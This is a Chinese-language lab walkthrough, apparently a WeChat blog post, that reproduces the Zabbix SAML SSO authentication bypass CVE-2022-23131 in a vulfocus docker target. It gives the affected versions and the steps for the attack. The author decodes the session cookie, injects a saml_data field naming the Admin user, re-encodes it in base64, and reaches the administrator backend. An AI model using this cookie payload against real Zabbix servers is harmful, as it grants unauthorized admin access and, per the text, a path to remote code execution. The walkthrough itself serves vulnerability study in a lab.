<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/790tr9XdeiHPeu9TeIcLkQ)

**描述：**  

Zabbix 对客户端提交的 Cookie 会话存在不安全的存储方式，导致在启动 SAML SSO 认证模式的前提下，恶意用户可通过构造特殊请求绕过认证，获取管理员权限，进而可实现 RCE。

**影响版本：**  

```
zabbix 5.4.0 - 5.4.8
zabbix 6.0.0alpha1

```

**漏洞复现：**

本次复现使用的是 vulfocus 靶场环境，官方平台我没有搜到靶场，但是本地搭建的环境可以搜索下载

```
环境名为：
vulfocus/zabbix-CVE-2022-23131
想复现的小伙伴可以使用docker拉取镜像
docker pull vulfocus/zabbix-CVE-2022-23131

```

开启靶场环境，访问 http://ip:port/zabbix 来到后台登录界面  

![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779bsTcC1rvf1rQr0raepPURO6L5xoIzsL0Hsib6O7Wqs6I60sDK71f0aDfY6bJgNDDObWwzRekFzOMw/640?wx_fmt=png)

尝试其他登录方式，会跳转到外部登录

```
http://192.168.0.102:63423/zabbix/index_sso.php

```

我们返回到登录界面，打开 hackbar，修改 cookie  

![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779bsTcC1rvf1rQr0raepPUROh0kXl2HPgILsx12R2pn13NwMRYR9x7IRsSNUVkE1UMpzsfq7ibcMFbA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779bsTcC1rvf1rQr0raepPUROkibgECSzibrXQcW6v2UGT62nzfBDV01Pb7F0rgSlrkpYvPGmjIr8eMRg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779bsTcC1rvf1rQr0raepPUROBEYmXgYfkhyV7bQAUicblnZ2cWPe1tWjXkMUF5gh8icXiamTswEqFTo6g/640?wx_fmt=png)

在解码后重新构造 payload

```
解码后：
{"sessionid":"bf2e46f77eedfed40c558dfe62665465","sign":"5fc8232d7c1226197f8d281ddafcaba8d2258afa8cd64445a7fe90eebeb391e2"}
重新构造：
{"saml_data":{"username_attribute":"Admin"},"sessionid":"bf2e46f77eedfed40c558dfe62665465","sign":"5fc8232d7c1226197f8d281ddafcaba8d2258afa8cd64445a7fe90eebeb391e2"}

```

重新使用 base64 编码  

![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779bsTcC1rvf1rQr0raepPUROI9BlLy65icR8u8U9WOj2egHLlOoSvnh5QiaAUNNPXt3BGfY9wyNj9tnw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779bsTcC1rvf1rQr0raepPURO0phRns3epehBm8yD8veG5l0DBYnylCuWUkOgiclbvbryXDU3AS6GQKQ/640?wx_fmt=png)

编码后粘贴回 cookie 并发送请求

![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779bsTcC1rvf1rQr0raepPURO78zID757CsCk7Ny9aBAlT5lnmtYRAcEm4aN9bcNKLmAH8LhfTSQC8w/640?wx_fmt=png)

发送后就会直接跳转到后台了

成功复现 Zabbix 身份认证绕过漏洞  

![](https://mmbiz.qpic.cn/mmbiz_png/6QQf7rC779bsTcC1rvf1rQr0raepPUROWGYaXZib5K1BebydpzewnXQricj9VKG9rKNLzLha2D4Sa1HwFQw7p7cA/640?wx_fmt=png)

至此复现结束

如果觉得对自己有帮助可以点击 “在看” 或分享给朋友一起学习、进步！